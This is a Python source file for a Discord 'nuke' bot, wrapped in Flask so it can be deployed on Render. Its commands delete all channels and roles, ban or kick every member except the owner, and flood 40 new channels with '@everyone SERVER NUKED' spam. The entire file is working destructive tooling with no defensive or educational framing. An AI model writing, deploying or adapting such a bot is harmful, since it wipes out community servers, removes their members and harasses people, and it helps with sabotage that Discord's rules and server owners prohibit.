# app.py
# Flask wrapper for the Discord nuke bot, deployable on Render.
# Requires: pip install flask discord.py
# Render: set TOKEN as environment variable, start command: python app.py

import os
import threading
import discord
from discord.ext import commands
from flask import Flask

TOKEN = os.environ.get("TOKEN", "YOUR_BOT_TOKEN_HERE")
PREFIX = "!"

SPAM_MESSAGE = "@everyone SERVER NUKED"
SPAM_COUNT = 20
CHANNEL_COUNT = 40

intents = discord.Intents.all()
bot = commands.Bot(command_prefix=PREFIX, intents=intents)

app = Flask(__name__)

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user} (ID: {bot.user.id})")

@bot.command(name="Start")
@commands.has_permissions(administrator=True)
async def start(ctx):
    guild = ctx.guild
    try:
        await ctx.message.delete()
    except Exception:
        pass

    # Delete all existing channels
    for channel in list(guild.channels):
        try:
            await channel.delete()
        except Exception:
            pass

    # Delete all roles except @everyone and managed roles
    for role in list(guild.roles):
        if role.name != "@everyone" and not role.managed:
            try:
                await role.delete()
            except Exception:
                pass

    # Ban all members except bot and owner
    for member in list(guild.members):
        if member != guild.me and member != guild.owner:
            try:
                await member.ban(reason="nuke")
            except Exception:
                pass

    # Create 40 channels and spam each
    for i in range(CHANNEL_COUNT):
        try:
            ch = await guild.create_text_channel(f"nuked-{i}")
            for _ in range(SPAM_COUNT):
                try:
                    await ch.send(SPAM_MESSAGE)
                except Exception:
                    pass
        except Exception:
            pass

@bot.command(name="Raid")
@commands.has_permissions(administrator=True)
async def raid(ctx):
    guild = ctx.guild
    try:
        await ctx.message.delete()
    except Exception:
        pass
    for i in range(CHANNEL_COUNT):
        try:
            ch = await guild.create_text_channel(f"raid-{i}")
            for _ in range(SPAM_COUNT):
                try:
                    await ch.send(SPAM_MESSAGE)
                except Exception:
                    pass
        except Exception:
            pass

@bot.command(name="Spam")
@commands.has_permissions(administrator=True)
async def spam(ctx, *, message: str):
    try:
        await ctx.message.delete()
    except Exception:
        pass
    for _ in range(SPAM_COUNT):
        try:
            await ctx.send(message)
        except Exception:
            pass

@bot.command(name="MassBan")
@commands.has_permissions(administrator=True)
async def massban(ctx):
    try:
        await ctx.message.delete()
    except Exception:
        pass
    for member in list(ctx.guild.members):
        if member != ctx.guild.me and member != ctx.guild.owner:
            try:
                await member.ban(reason="massban")
            except Exception:
                pass

@bot.command(name="MassKick")
@commands.has_permissions(administrator=True)
async def masskick(ctx):
    try:
        await ctx.message.delete()
    except Exception:
        pass
    for member in list(ctx.guild.members):
        if member != ctx.guild.me and member != ctx.guild.owner:
            try:
                await member.kick(reason="masskick")
            except Exception:
                pass

def run_bot():
    bot.run(TOKEN)

@app.route("/")
def index():
    return "Bot running", 200

@app.route("/health")
def health():
    return "OK", 200

if __name__ == "__main__":
    # Start Discord bot in a background thread
    t = threading.Thread(target=run_bot, daemon=True)
    t.start()

    # Start Flask web server (Render provides PORT env var)
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)
